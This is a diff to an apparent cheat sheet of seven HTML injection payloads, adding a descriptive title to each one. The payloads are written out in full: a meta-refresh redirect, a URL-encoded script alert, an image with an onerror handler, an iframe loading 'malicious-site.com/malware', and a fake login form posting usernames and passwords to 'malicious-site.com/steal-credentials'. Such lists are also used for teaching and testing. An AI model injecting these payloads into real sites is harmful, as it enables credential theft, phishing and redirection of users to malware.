@@ -1,24 +1,24 @@
-🌐 Payload #1:
+🌐 Payload #1: Basic Payload
 <h1>Hello, HTML Injection!</h1>
 
-🌐 Payload #2:
+🌐 Payload #2: Payload with Image Embedding
 <img src="https://malicious-site.com/malicious-image.jpg" onerror="alert('Image Load Failed!');">
 
-🌐 Payload #3:
+🌐 Payload #3: Payload with Inline Styles
 <p style="color:red;">This is a styled paragraph.</p>
 
-🌐 Payload #4:
+🌐 Payload #4: Payload to Redirect
 <meta http-equiv="refresh" content="0;url=https://malicious-site.com">
 
-🌐 Payload #5:
+🌐 Payload #5: Payload with Unicode Encoding
 %3Cscript%3Ealert(%27Unicode%20Encoded%20Payload%27)%3B%3C/script%3E
 
-🌐 Payload #6:
+🌐 Payload #6: Payload to Modify Form Action
 <form action="https://malicious-site.com/steal-credentials" method="post">
   <input type="text" name="username" placeholder="Username">
   <input type="password" name="password" placeholder="Password">
   <input type="submit" value="Submit">
 </form>
 
-🌐 Payload #7:
+🌐 Payload #7: Payload to Load External Resource
 <iframe src="https://malicious-site.com/malware"></iframe>
